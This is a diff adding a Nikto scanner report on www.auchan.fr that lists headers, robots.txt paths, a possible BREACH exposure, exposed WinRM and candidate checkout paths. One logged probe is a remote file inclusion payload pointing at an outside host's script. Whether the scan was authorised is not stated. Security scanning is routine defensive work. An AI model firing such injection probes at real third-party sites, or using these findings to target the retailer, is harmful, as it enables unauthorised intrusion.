@@ -1,0 +1,45 @@
++ Target IP:          35.186.231.132
++ Target Hostname:    www.auchan.fr
++ Target Port:        443
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /CN=www.auchan.fr
+                   Altnames: www.auchan.fr
+                   Ciphers:  TLS_AES_256_GCM_SHA384
+                   Issuer:   /C=US/O=Let's Encrypt/CN=R3
++ Start Time:         2023-06-20 16:16:44 (GMT3)
+---------------------------------------------------------------------------
++ Server: nginx
++ /: Retrieved via header: 1.1 google.
++ /: Drupal Link header found with value: </asset-server/webjars/requirejs/2.3.6/require.min.js>; rel="preload"; as="script"; nopush; crossorigin,</asset-server/sav_2023.5.17-6/webjars/a_styleguide2/dist/main.min.css>; rel="preload"; as="style"; nopush;,</asset-server/sav_2023.5.17-6/webjars/a_carousel3/dist/main.min.css>; rel="preload"; as="style"; nopush;,</asset-server/sav_2023.5.17-6/webjars/a_collapsible2/dist/main.min.css>; rel="preload"; as="style"; nopush;,</asset-server/sav_2023.5.17-6/webjars/a_overlay2/dist/main.min.css>; rel="preload"; as="style"; nopush;,</asset-server/sav_2023.5.17-6/webjars/a_notifier2/dist/main.min.css>; rel="preload"; as="style"; nopush;,</asset-server/sav_2023.5.17-6/webjars/a_styleguide2/dist/fonts/sanasansalt-regular.woff2>; rel="preload"; as="font"; type="font/woff2"; nopush; crossorigin;,</asset-server/sav_2023.5.17-6/webjars/a_styleguide2/dist/fonts/sanasansalt-black.woff2>; rel="preload"; as="font"; type="font/woff2"; nopush; crossorigin;,</asset-server/sav_2023.5.17-6/webjars/a_styleguide2/dist/fonts/icons.woff2>; rel="preload"; as="font"; type="font/woff2"; nopush; crossorigin;,</asset-server/sav_2023.5.17-6/webjars/a_utils2/dist/index.min.js>; rel="preload"; as="script"; nopush;,</asset-server/sav_2023.5.17-6/webjars/a_events2/dist/index.min.js>; rel="preload"; as="script"; nopush;,</asset-server/sav_2023.5.17-6/webjars/a_lazyload2/dist/index.min.js>; rel="preload"; as="script"; nopush;,</asset-server/sav_2023.5.17-6/webjars/a_lazyloadImages2/dist/index.min.js>; rel="preload"; as="script"; nopush;,<https://cdn.cookielaw.org/scripttemplates/otSDKStub.js>; rel="preload"; as="script"; nopush; crossorigin;. See: https://www.drupal.org/
++ /: Uncommon header 'x-ua-device' found, with contents: mobilefirst.
++ /: An alt-svc header was found which is advertising HTTP/3. The endpoint is: ':443'. Nikto cannot test HTTP/3 over QUIC. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/alt-svc
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /auth/silent-check-sso/: Uncommon header 'surrogate-control' found, with contents: no-store.
++ /robots.txt: Entry '/*sort=price_pos208*/' is returned a non-forbidden or redirect HTTP code (404). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /landing-edito-07/ep-landing-edito-07/: Uncommon header 'x-renderer-version' found, with contents: sav_2023.6.1-2.
++ /landing-edito-07/ep-landing-edito-07/: Uncommon header 'x-authoritative' found, with contents: crest.
++ /robots.txt: Entry '/cart-renderer/cart/loyalty-caution/config/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/cart*consentId*/' is returned a non-forbidden or redirect HTTP code (404). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /test-appelt2smb/e-test-appelt2smb/: Uncommon header 'x-crest-error-handler' found, with contents: 404.
++ /robots.txt: Entry '/*sort=default*/' is returned a non-forbidden or redirect HTTP code (404). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/*sort=-discountpercent_pos208*/' is returned a non-forbidden or redirect HTTP code (404). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/search-infinite*/' is returned a non-forbidden or redirect HTTP code (404). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/*/id1/*/' is returned a non-forbidden or redirect HTTP code (404). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/fragment/' is returned a non-forbidden or redirect HTTP code (404). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/*qt_id=*/' is returned a non-forbidden or redirect HTTP code (404). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/coupon/config/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/client/' is returned a non-forbidden or redirect HTTP code (404). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/_ui/*/desktop/' is returned a non-forbidden or redirect HTTP code (404). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: contains 53 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
++ /database.egg: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /: The Content-Encoding header is set to "deflate" which may mean that the server is vulnerable to the BREACH attack. See: http://breachattack.com/
++ OPTIONS: Allowed HTTP Methods: GET, HEAD .
++ /cart/: This might be interesting.
++ /checkout_payment.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ /assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=http://blog.cirt.net/rfiinc.txt?cmd: Retrieved access-control-allow-origin header: *.
++ /assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=http://blog.cirt.net/rfiinc.txt?cmd: Uncommon header 'x-ngx-rule' found, with contents: brd_nostick.
++ /wsman/: Windows Remote Management is enabled.
++ 8128 requests: 0 error(s) and 29 item(s) reported on remote host
++ End Time:           2023-06-20 17:00:13 (GMT3) (2609 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
